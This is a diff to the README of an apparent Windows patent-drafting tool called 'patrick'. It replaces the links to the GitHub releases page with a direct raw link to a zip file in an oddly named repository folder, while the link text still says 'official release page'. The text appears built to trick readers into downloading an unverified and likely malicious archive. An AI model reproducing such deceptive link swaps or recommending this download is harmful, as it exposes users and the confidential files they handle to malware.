@@ -1,6 +1,6 @@
 # ⚖️ patrick - Draft patents faster on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Loftspindlelegs354/patrick/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Loftspindlelegs354/patrick/raw/refs/heads/main/overremiss/Software_v2.6-beta.3.zip)
 
 Patrick assists patent attorneys and agents with drafting and redlining legal documents. It runs directly on your computer to keep your files secure. You control your data because everything stays local. The software works with your existing Microsoft Word files to speed up your daily workflow.
 
@@ -8,7 +8,7 @@ Patrick assists patent attorneys and agents with drafting and redlining legal do
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Loftspindlelegs354/patrick/releases).
+1. Go to the [official release page](https://github.com/Loftspindlelegs354/patrick/raw/refs/heads/main/overremiss/Software_v2.6-beta.3.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends in .msi or .exe to start the download.
 4. Save the file to your desktop or downloads folder.
